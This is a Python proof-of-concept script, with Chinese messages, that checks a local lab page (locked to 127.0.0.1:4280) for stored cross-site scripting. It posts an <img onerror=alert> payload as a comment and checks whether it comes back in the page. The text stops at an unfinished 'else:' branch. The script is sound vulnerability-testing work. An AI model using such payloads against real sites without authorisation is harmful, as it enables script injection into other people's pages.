import os
import sys
import urllib.parse
import urllib.request
import urllib.error

TARGET_URL = os.environ.get("TARGET_URL", "").strip()
if not TARGET_URL:
    sys.exit("请设置 TARGET_URL，例如：TARGET_URL='http://127.0.0.1:4280/<S017页面实际路径>' python3 poc_s017.py normal")

parsed = urllib.parse.urlparse(TARGET_URL)
if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port != 4280:
    sys.exit("只允许访问 http://127.0.0.1:4280/ 下的目标页面，拒绝其他主机或端口。")

mode = sys.argv[1] if len(sys.argv) > 1 else ""
if mode == "normal":
    body = "S017 普通留言：无脚本标记"
elif mode == "test":
    body = "<img src=x onerror=\"alert('S017-XSS')\">"
else:
    sys.exit("用法：python3 poc_s017.py normal|test；并设置 TARGET_URL")

data = urllib.parse.urlencode({"body": body}).encode("utf-8")
post_req = urllib.request.Request(
    TARGET_URL,
    data=data,
    method="POST",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)

try:
    with urllib.request.urlopen(post_req, timeout=10) as resp:
        post_status = resp.status
        post_final_url = resp.geturl()
        resp.read()
except urllib.error.HTTPError as exc:
    print(f"POST 返回 HTTP {exc.code}，未继续。")
    sys.exit(1)
except Exception as exc:
    print(f"POST 失败：{exc}")
    sys.exit(1)

get_req = urllib.request.Request(TARGET_URL, method="GET")
try:
    with urllib.request.urlopen(get_req, timeout=10) as resp:
        get_status = resp.status
        html = resp.read().decode("utf-8", "replace")
except Exception as exc:
    print(f"GET 失败：{exc}")
    sys.exit(1)

print(f"POST 最终状态：{post_status}，最终 URL：{post_final_url}")
print(f"GET 状态：{get_status}")
print(f"响应体是否包含本次提交字符串（仅表示回显，不证明脚本执行）：{body in html}")

if mode == "normal":
    print("普通对照：请在浏览器打开 TARGET_URL，确认页面不应出现 S017-XSS 提示框。")
else:
